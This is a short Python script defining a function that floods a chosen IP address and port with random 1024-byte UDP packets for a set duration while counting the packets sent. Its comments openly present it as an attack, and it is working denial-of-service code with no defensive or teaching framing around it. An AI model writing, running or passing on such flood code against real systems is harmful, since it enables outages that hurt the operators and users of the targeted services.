import socket
import random
import time


# Function to execute a UDP flood attack
def udp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration  # Calculate the attack end time
    print(f"Starting UDP flood on {target_ip}:{target_port} for {duration} seconds. >;)")

    # Create a UDP socket for sending datagrams(the actual data), no connection needed! using IPv4 and UDP protocol.
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = random._urandom(1024)  # random 1024-byte payload the data we're sending.

    packet_count = 0  # Counter for the number of packets sent
    while time.time() < timeout:  # Run until the specified duration expires
        try:
            udp_socket.sendto(message, (target_ip, target_port))  # Sends the message to the target_ip and target_port.
            packet_count += 1  # Increment the packet count

            # Log every 100,000 packets sent to provide feedback during flood
            if packet_count % 100000 == 0:
                print(f"Packets sent: {packet_count}")
        except Exception as e:
            print(f"Error: {e}")  # Handle any errors during packet sending

    print(f"UDP flood finished. Total amount of packets sent: {packet_count}")
